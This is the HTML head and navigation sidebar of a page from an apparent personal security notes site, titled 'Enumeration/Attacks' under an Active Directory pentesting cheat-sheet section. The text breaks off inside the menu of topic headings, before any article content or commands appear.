<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Active Directory, Azure AD, Windows security research"><meta name=author content=neutron><link href=https://neutronsec.com/cheat_sheets/active_directory/enumeration_and_attacks/ rel=canonical><link rel=icon href=../../../assets/favicon.png><meta name=generator content="mkdocs-1.3.1, mkdocs-material-8.4.4+insiders-4.23.1"><title>Enumeration/Attacks - neutronsec</title><link rel=stylesheet href=../../../assets/stylesheets/main.6148a559.min.css><link rel=stylesheet href=../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Inter";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme data-md-color-primary data-md-color-accent> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#tools-of-the-trade class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../.. title=neutronsec class="md-header__button md-logo" aria-label=neutronsec data-md-component=logo> <img src=../../../assets/images/illustration.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> neutronsec </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Enumeration/Attacks </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media=(prefers-color-scheme) data-md-color-scheme data-md-color-primary data-md-color-accent aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to system preference" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to system preference" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> </form> <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" title=Share aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../../about/ class=md-tabs__link> About </a> </li> <li class=md-tabs__item> <a href=../../../blog/ class=md-tabs__link> Blog </a> </li> <li class=md-tabs__item> <a href=../../../docs/ class="md-tabs__link md-tabs__link--active"> Notes </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title=neutronsec class="md-nav__button md-logo" aria-label=neutronsec data-md-component=logo> <img src=../../../assets/images/illustration.png alt=logo> </a> neutronsec </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class=md-nav__item> <a href=../../../about/ class=md-nav__link> <span class=md-ellipsis> About </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <div class="md-nav__link md-nav__container"> <a href=../../../blog/ class="md-nav__link "> <span class=md-ellipsis> Blog </span> </a> <label class="md-nav__link " for=__nav_3> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> <span class=md-ellipsis> Archive </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Archive data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> Archive </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blog/archive/2022/ class=md-nav__link> <span class=md-ellipsis> 2022 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_3 type=checkbox id=__nav_3_3> <label class=md-nav__link for=__nav_3_3> <span class=md-ellipsis> Categories </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Categories data-md-level=2> <label class=md-nav__title for=__nav_3_3> <span class="md-nav__icon md-icon"></span> Categories </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blog/category/blog/ class=md-nav__link> <span class=md-ellipsis> Blog </span> </a> </li> <li class=md-nav__item> <a href=../../../blog/category/hackthebox/ class=md-nav__link> <span class=md-ellipsis> HackTheBox </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4 checked> <div class="md-nav__link md-nav__container"> <a href=../../../docs/ class="md-nav__link "> <span class=md-ellipsis> Notes </span> </a> <label class="md-nav__link " for=__nav_4> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Notes data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Notes </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2 type=checkbox id=__nav_4_2 checked> <label class=md-nav__link for=__nav_4_2> <span class=md-ellipsis> Cheatsheets </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Cheatsheets data-md-level=2> <label class=md-nav__title for=__nav_4_2> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2_1 type=checkbox id=__nav_4_2_1 checked> <label class=md-nav__link for=__nav_4_2_1> <span class=md-ellipsis> Pentesting / CTF </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Pentesting / CTF" data-md-level=3> <label class=md-nav__title for=__nav_4_2_1> <span class="md-nav__icon md-icon"></span> Pentesting / CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2_1_1 type=checkbox id=__nav_4_2_1_1 checked> <label class=md-nav__link for=__nav_4_2_1_1> <span class=md-ellipsis> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Directory" data-md-level=4> <label class=md-nav__title for=__nav_4_2_1_1> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../cheatsheet_aid/ class=md-nav__link> <span class=md-ellipsis> Basics </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Enumeration/Attacks </span> </a> </li> <li class=md-nav__item> <a href=../exploitation/ class=md-nav__link> <span class=md-ellipsis> Exploitation </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2_1_2 type=checkbox id=__nav_4_2_1_2> <label class=md-nav__link for=__nav_4_2_1_2> <span class=md-ellipsis> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=4> <label class=md-nav__title for=__nav_4_2_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../privesc/linux/ class=md-nav__link> <span class=md-ellipsis> Linux </span> </a> </li> <li class=md-nav__item> <a href=../../privesc/windows/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../cheatsheet-77/ class=md-nav__link> <span class=md-ellipsis> Commands </span> </a> </li> <li class=md-nav__item> <a href=../../linux_shortcuts/ class=md-nav__link> <span class=md-ellipsis> Linux Shortcuts </span> </a> </li> <li class=md-nav__item> <a href=../../windows/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/ class=md-nav__link> <span class=md-ellipsis> Shells & Payloads </span> </a> </li> <li class=md-nav__item> <a href=../../web_requests/ class=md-nav__link> <span class=md-ellipsis> Web requests </span> </a> </li> <li class=md-nav__item> <a href=../../deobfuscation/ class=md-nav__link> <span class=md-ellipsis> (De)Obfuscation </span> </a> </li> <li class=md-nav__item> <a href=../../brute_forcing/ class=md-nav__link> <span class=md-ellipsis> Brute Forcing </span> </a> </li> <li class=md-nav__item> <a href=../../common_apps/ class=md-nav__link> <span class=md-ellipsis> Common Applications </span> </a> </li> <li class=md-nav__item> <a href=../../web_attacks/ class=md-nav__link> <span class=md-ellipsis> Web Attacks </span> </a> </li> <li class=md-nav__item> <a href=../../file_transfer/ class=md-nav__link> <span class=md-ellipsis> File Transfer </span> </a> </li> <li class=md-nav__item> <a href=../../footprinting/ class=md-nav__link> <span class=md-ellipsis> Footprinting </span> </a> </li> <li class=md-nav__item> <a href=../../cheatsheet_ptpf/ class=md-nav__link> <span class=md-ellipsis> Pivoting, Tunnel, Port Forwarding </span> </a> </li> <li class=md-nav__item> <a href=../../info_gathering_web/ class=md-nav__link> <span class=md-ellipsis> Information Gathering - Web </span> </a> </li> <li class=md-nav__item> <a href=../../msf/ class=md-nav__link> <span class=md-ellipsis> MSF </span> </a> </li> <li class=md-nav__item> <a href=../../password_attacks/ class=md-nav__link> <span class=md-ellipsis> Password Attacks </span> </a> </li> <li class=md-nav__item> <a href=../../attacking_common_services/ class=md-nav__link> <span class=md-ellipsis> Attacking Common Services </span> </a> </li> <li class=md-nav__item> <a href=../../ffuf/ class=md-nav__link> <span class=md-ellipsis> FFUF </span> </a> </li> <li class=md-nav__item> <a href=../../hydra/ class=md-nav__link> <span class=md-ellipsis> Hydra </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3 type=checkbox id=__nav_4_3> <label class=md-nav__link for=__nav_4_3> <span class=md-ellipsis> Red Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Team" data-md-level=2> <label class=md-nav__title for=__nav_4_3> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1 type=checkbox id=__nav_4_3_1> <label class=md-nav__link for=__nav_4_3_1> <span class=md-ellipsis> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Directory" data-md-level=3> <label class=md-nav__title for=__nav_4_3_1> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_1 type=checkbox id=__nav_4_3_1_1> <label class=md-nav__link for=__nav_4_3_1_1> <span class=md-ellipsis> Initial Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Initial Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_1> <span class="md-nav__icon md-icon"></span> Initial Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/initial_enum/external_recon_enum_principles/ class=md-nav__link> <span class=md-ellipsis> External Recon </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/initial_enum/init_enum_domain/ class=md-nav__link> <span class=md-ellipsis> Initial Enumeration of the Domain </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_2 type=checkbox id=__nav_4_3_1_2> <label class=md-nav__link for=__nav_4_3_1_2> <span class=md-ellipsis> Gaining a Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Gaining a Foothold" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_2> <span class="md-nav__icon md-icon"></span> Gaining a Foothold </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/foothold/llmnr_nbtns_poisonong_from_linux/ class=md-nav__link> <span class=md-ellipsis> LLMNR/NBT-NS Poisoning - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/foothold/llmnr_nbtns_poisonong_from_windows/ class=md-nav__link> <span class=md-ellipsis> LLMNR/NBT-NS Poisoning - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_3 type=checkbox id=__nav_4_3_1_3> <label class=md-nav__link for=__nav_4_3_1_3> <span class=md-ellipsis> Hunting for a User </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hunting for a User" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_3> <span class="md-nav__icon md-icon"></span> Hunting for a User </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/userhunting/enumerate_retrieve_pwdpol/ class=md-nav__link> <span class=md-ellipsis> Enumerating & Retrieving PwdPols </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/userhunting/pwd_spraying_target_user_list/ class=md-nav__link> <span class=md-ellipsis> Pwd Spraying - Making a Targeted User List </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_4 type=checkbox id=__nav_4_3_1_4> <label class=md-nav__link for=__nav_4_3_1_4> <span class=md-ellipsis> PwSpray </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PwSpray data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_4> <span class="md-nav__icon md-icon"></span> PwSpray </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/spray_responsibility/internal_pwd_spray_from_linux/ class=md-nav__link> <span class=md-ellipsis> Internal Spraying - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/spray_responsibility/internal_pwd_spray_from_windows/ class=md-nav__link> <span class=md-ellipsis> Internal Spraying - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_5 type=checkbox id=__nav_4_3_1_5> <label class=md-nav__link for=__nav_4_3_1_5> <span class=md-ellipsis> Post Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Post Foothold" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_5> <span class="md-nav__icon md-icon"></span> Post Foothold </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/deeper_down_the_rabbithole/enumerating_security_controls/ class=md-nav__link> <span class=md-ellipsis> Enumerating Security Controls </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_linux/ class=md-nav__link> <span class=md-ellipsis> Credentialed Enumeration - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_windows/ class=md-nav__link> <span class=md-ellipsis> Credentialed Enumeration - Windows </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/deeper_down_the_rabbithole/living_off_the_land/ class=md-nav__link> <span class=md-ellipsis> Living Off The Land </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_6 type=checkbox id=__nav_4_3_1_6> <label class=md-nav__link for=__nav_4_3_1_6> <span class=md-ellipsis> Kerberoasting </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Kerberoasting data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_6> <span class="md-nav__icon md-icon"></span> Kerberoasting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/cooking_with_fire/kerberoasting_from_linux/ class=md-nav__link> <span class=md-ellipsis> Kerberoasting - Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/cooking_with_fire/kerberoasting_from_windows/ class=md-nav__link> <span class=md-ellipsis> Kerberoasting - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_7 type=checkbox id=__nav_4_3_1_7> <label class=md-nav__link for=__nav_4_3_1_7> <span class=md-ellipsis> ACLs </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ACLs data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_7> <span class="md-nav__icon md-icon"></span> ACLs </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/acls/acl_enumeration/ class=md-nav__link> <span class=md-ellipsis> ACL Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/acls/acl_abuse/ class=md-nav__link> <span class=md-ellipsis> ACL Abuse Tactics </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/acls/dcsync/ class=md-nav__link> <span class=md-ellipsis> DCSync </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_8 type=checkbox id=__nav_4_3_1_8> <label class=md-nav__link for=__nav_4_3_1_8> <span class=md-ellipsis> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_8> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/stacking_the_deck/privileged_access/ class=md-nav__link> <span class=md-ellipsis> Privileged Access </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/stacking_the_deck/kerberos_double_hop/ class=md-nav__link> <span class=md-ellipsis> Kerberos Double Hop </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/stacking_the_deck/bleeding_edge_vulns/ class=md-nav__link> <span class=md-ellipsis> Vulnerabilities </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/stacking_the_deck/miscellaneous_misconfigurations/ class=md-nav__link> <span class=md-ellipsis> Misconfigurations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_9 type=checkbox id=__nav_4_3_1_9> <label class=md-nav__link for=__nav_4_3_1_9> <span class=md-ellipsis> Domain Trusts </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Domain Trusts" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_9> <span class="md-nav__icon md-icon"></span> Domain Trusts </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/why_so_trusting/domain_trusts_primer/ class=md-nav__link> <span class=md-ellipsis> Domain Trusts Primer </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_win/ class=md-nav__link> <span class=md-ellipsis> Attacking Domain Trusts - Child -> Parent - from Windows </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_linux/ class=md-nav__link> <span class=md-ellipsis> Attacking Domain Trusts - Child -> Parent - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_10 type=checkbox id=__nav_4_3_1_10> <label class=md-nav__link for=__nav_4_3_1_10> <span class=md-ellipsis> Cross-Forest Trust Abuse </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Cross-Forest Trust Abuse" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_10> <span class="md-nav__icon md-icon"></span> Cross-Forest Trust Abuse </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/cross_forest_trust/cross_forest_trust_abuse_from_win/ class=md-nav__link> <span class=md-ellipsis> Cross-Forest Trust Abuse - from Windows </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/cross_forest_trust/cross_forest_trust_abuse_from_linux/ class=md-nav__link> <span class=md-ellipsis> Cross-Forest Trust Abuse - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_1_11 type=checkbox id=__nav_4_3_1_11> <label class=md-nav__link for=__nav_4_3_1_11> <span class=md-ellipsis> Defensive Considerations </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Defensive Considerations" data-md-level=4> <label class=md-nav__title for=__nav_4_3_1_11> <span class="md-nav__icon md-icon"></span> Defensive Considerations </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../active_directory/defensive_considerations/hardening_ad/ class=md-nav__link> <span class=md-ellipsis> Hardening Active Directory </span> </a> </li> <li class=md-nav__item> <a href=../../../active_directory/defensive_considerations/additional_auditing_techniques/ class=md-nav__link> <span class=md-ellipsis> Additional AD Auditing Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_2 type=checkbox id=__nav_4_3_2> <label class=md-nav__link for=__nav_4_3_2> <span class=md-ellipsis> Footprinting </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Footprinting data-md-level=3> <label class=md-nav__title for=__nav_4_3_2> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../footprinting/domain_information/ class=md-nav__link> <span class=md-ellipsis> Domain Information </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_2_2 type=checkbox id=__nav_4_3_2_2> <label class=md-nav__link for=__nav_4_3_2_2> <span class=md-ellipsis> Host Based Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Host Based Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_4_3_2_2> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../footprinting/ftp/ class=md-nav__link> <span class=md-ellipsis> FTP </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/smb/ class=md-nav__link> <span class=md-ellipsis> SMB </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/nfs/ class=md-nav__link> <span class=md-ellipsis> NFS </span> </a> </li> <li class=md-nav__item> <a 